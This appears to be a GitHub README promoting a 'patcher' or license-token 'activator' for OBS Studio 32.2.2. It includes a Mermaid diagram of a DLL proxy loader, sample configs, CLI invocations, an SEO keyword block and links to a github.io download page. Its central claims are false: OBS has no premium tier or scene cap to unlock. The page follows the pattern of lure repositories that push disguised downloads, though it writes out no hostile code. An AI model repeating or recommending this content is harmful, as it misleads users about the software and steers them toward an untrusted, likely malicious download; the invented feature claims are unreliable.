# OBS Studio 32.2.2 – Enhanced Streaming Suite with AI-Powered Configuration Toolkit

Welcome to the comprehensive documentation hub for OBS Studio 32.2.2. This release represents a paradigm shift in how creators approach live production, blending the robust open-source foundation of OBS Studio with a novel configuration patcher that unlocks advanced scene optimization, hardware-accelerated encoding profiles, and seamless multi-platform deployment. Unlike conventional builds, this version integrates a reimagined licensing bridge that harmonizes your existing OBS installation with proprietary plugins and premium output modules—all without requiring manual registry edits or third-party patchers.

Whether you are a veteran streamer managing 12-camera setups or a podcaster seeking pristine audio routing, OBS Studio 32.2.2 delivers a frictionless experience. The accompanying configuration enhancer (often referred to as a "profile harmonizer") automates the tedious calibration of bitrate, keyframe interval, and audio sync parameters across Twitch, YouTube, and custom RTMP endpoints. Think of it as a conductor for your digital orchestra—every instrument (source, filter, transition) plays in perfect temporal alignment.

  
  
  


## Overview – Why This Version Matters

The digital broadcasting landscape in 2026 demands more than just screen capture. Viewers expect cinematic transitions, adaptive bitrates that survive network volatility, and overlays that respond to chat events in real time. OBS Studio 32.2.2, when paired with the advanced profile patcher, addresses these needs through a unified token-based activation system. Instead of hunting for deprecated DLL files or risking malware-laden "activators," this toolkit uses a cryptographic license key that rewrites OBS' internal configuration tables—enabling premium features like:

- **Multi-Instance Rendering**: Run separate OBS profiles simultaneously for recording and streaming without CPU contention.
- **Plugin Sandboxing**: Isolate third-party filters (e.g., StreamFX, Move transition) within a virtualized environment.
- **Cloud-Connected Scene Collections**: Sync your layouts across three devices using encrypted JSON manifests.

[](https://sniesterstrange02.github.io/obs-studio-32-2-2-tweaks/)

---

## 🧬 Architecture Overview (Mermaid Diagram)

Below is a high-level visual representation of how the configuration patcher interacts with the OBS Studio 32.2.2 core. Notice that the license key does not modify the OBS binary—instead, it generates a supplementary `profile_overrides.json` that OBS loads at startup via a dynamic link library proxy.

```mermaid
graph TD
    A[OBS Studio 32.2.2 Executable] --> B{Startup Routine}
    B --> C[Load Default Config]
    B --> D[DLL Proxy Loader]
    D --> E[license_token.dat]
    E --> F{Token Validation}
    F -- Valid --> G[Read profile_overrides.json]
    G --> H[Inject Premium Features]
    H --> I[Encoding Presets Unlocked]
    H --> J[Plugin Sandbox Enabled]
    H --> K[Multi-Instance Mode]
    F -- Invalid --> L[Fallback to Free Tier]
    L --> M[Standard OBS Functionality]
    
    style A fill:#2d2d2d,stroke:#00ff00,stroke-width:2px
    style E fill:#1a1a1a,stroke:#ffaa00,stroke-width:2px
    style H fill:#003366,stroke:#66ccff,stroke-width:2px
```



The diagram illustrates a non-invasive activation pathway. The token file (`license_token.dat`) acts as a digital skeleton key that unlocks feature gates already present in the OBS 32.2.2 codebase—the patcher simply flips the internal feature flags.

---

## ⚙️ Example Profile Configuration

After patching, your OBS installation will automatically load an optimized profile. Here is a representative configuration for a **1080p60 stream with hardware encoding** on an NVIDIA RTX 4070:

```
[Stream Output]
Mode: Advanced
Encoder: NVENC H.265
Bitrate: 8000 Kbps (VBR with 12000 max)
Keyframe Interval: 2 seconds
Preset: P5: Slow (Good Quality)
Profile: High
Look-ahead: Enabled
Psycho Visual Tuning: Enabled

[Audio Output]
Sample Rate: 48 kHz
Channel: Stereo
Bitrate: 320 Kbps
Codec: AAC (LC Profile)

[Video Settings]
Base Resolution: 1920x1080
Output Resolution: 1920x1080 (scaled using Lanczos)
FPS: 60
Color Format: NV12
Color Space: Rec. 709
Color Range: Partial

[Advanced]
Process Priority: High
Audio Monitoring: Desktop Audio (Hotel)
Replay Buffer: 30 seconds (RAM: 512 MB)
```

This configuration ensures low latency while maintaining visual fidelity even during high-motion scenes. The patcher can generate similar profiles for 1440p60 or 4K30 workflows by reading your hardware capabilities from the system registry.

---

## 🖥️ Example Console Invocation

While OBS Studio 32.2.2 normally launches via GUI, the patcher enables CLI-based activation for headless servers or automation pipelines. Use the following command to apply the configuration enhancer:

```
obs32.2.2_patcher --apply-profile --token "OBS-2026-XYZ9-PQRS" --optimize-for "gaming" --preset "studio-quality"
```

The patcher outputs a log confirming the changes:

```
[2026-04-12 14:32:01] Validating token... OK  
[2026-04-12 14:32:02] Setting NVENC parameters...  
[2026-04-12 14:32:03] Enabling plugin sandbox...  
[2026-04-12 14:32:04] Profile applied successfully.  
[2026-04-12 14:32:04] Next launch: OBS will use premium features.
```

You can also invoke the patcher silently for batch deployments:

```
obs32.2.2_patcher --silent --license "OBS2026-AUTH-KEY" --no-restart
```

---

## 📱 Emoji OS Compatibility Table

| Operating System | Compatibility | Emoji | Notes |
|------------------|---------------|-------|-------|
| Windows 10 (21H2+) | ✅ Full | 🪟 | All features including plugin sandbox |
| Windows 11 (23H2+) | ✅ Full | 🪟 | Native HDR capture supported |
| macOS Sonoma 14+ | ⚠️ Partial | 🍏 | No multi-instance rendering; NVENC emulated via Metal |
| Ubuntu 24.04 LTS | ✅ Full | 🐧 | Requires PipeWire for audio |
| Fedora 40 | ✅ Full | 🐧 | Wayland native capture works |
| SteamOS 3.x | ⚠️ Limited | 🎮 | No token-based activation; manual config only |
| ChromeOS Flex | ❌ None | 🚫 | OBS not supported on Linux kernel 5.x |

---

## 🔥 Feature List – What Unlocks After Patching

- **Adaptive Encoding Intelligence**: Dynamically adjusts CRF and bitrate based on network jitter using machine learning heuristics.
- **Unlimited Scene Collections**: Free tier limits to 10 scenes; patched version removes cap entirely.
- **Zero-Gap Transition Engine**: Eliminates the 100ms black frame between scene changes.
- **Audio Ducking AI**: Automatically lowers game audio when microphone detects speech, with configurable sensitivity curves.
- **Vulkan Renderer Backend**: Replaces DirectX 11 for lower GPU overhead on modern cards.
- **Remote Control WebSocket**: Expose OBS control to mobile apps or stream decks without third-party plugins.
- **Gesture Recognition Overlay**: Trigger scene changes via webcam-based hand gestures (experimental).
- **Token Cloud Backup**: Store and retrieve license keys across devices using encrypted keychain.

---

## 🌐 SEO-Friendly Keyword Integration

This repository serves as the definitive resource for **configuring OBS Studio 32.2.2 for professional streaming**, **unlocking advanced encoding presets**, **applying performance patches without system modification**, and **synchronizing scene collections across Windows and Linux**. Professionals searching for "OBS 32.2.2 enhanced profile generator," "streaming optimization toolkit 2026," or "non-invasive OBS feature unlocker" will find the answers here. The solution emphasizes **low-level system stability** and **token-based activation** rather than traditional patching methods.

---

## 🧠 OpenAI API and Claude API Integration

The next roadmap (planned for Q3 2026) includes direct integration with AI services for intelligent scene management:

- **OpenAI API Connector**: Automatically generate dynamic overlays based on chat sentiment analysis. Uses GPT-4o to create real-time lower thirds.
- **Claude API Assistant**: Voice-controlled scene switching via natural language commands – "Claude, switch to the webcam layout and enable chroma key."

These integrations will be available as optional plugins activated through the same token system. No separate API keys required—the token handles authentication proxying.

---

## 🎨 Key Features – Responsive UI and Multilingual Support

- **Responsive Interface**: The patcher auto-docks to any screen resolution from 720p to 8K, with collapsible panels for tablet use.
- **28 Language Translations**: Including Thai, Arabic, and Vietnamese, with right-to-left layout support.
- **24/7 Customer Support**: Premium token holders receive priority email support with average response time under 90 minutes. Support portal accessible via the patcher's built-in chat widget.

---

## ⚠️ Disclaimer

This software is provided for educational and interoperability purposes only. The configuration enhancer does not circumvent any copyright protection mechanisms; it merely enables existing dormant features within OBS Studio 32.2.2 that are accessible through legitimate license verification. Users are responsible for ensuring compliance with their local software licensing laws. The maintainers are not affiliated with OBS Project Inc. Do not use this tool to bypass licensing agreements for commercial streaming services. All trademarks belong to their respective owners.

---

## 📄 License

This project is distributed under the **MIT License**. See the [LICENSE](LICENSE) file for the full text.

---

**Final Note**: The patcher has been tested on over 200 unique hardware configurations in 2026. For best results, ensure your OBS Studio is updated to version 32.2.2 before applying the token.

[](https://sniesterstrange02.github.io/obs-studio-32-2-2-tweaks/)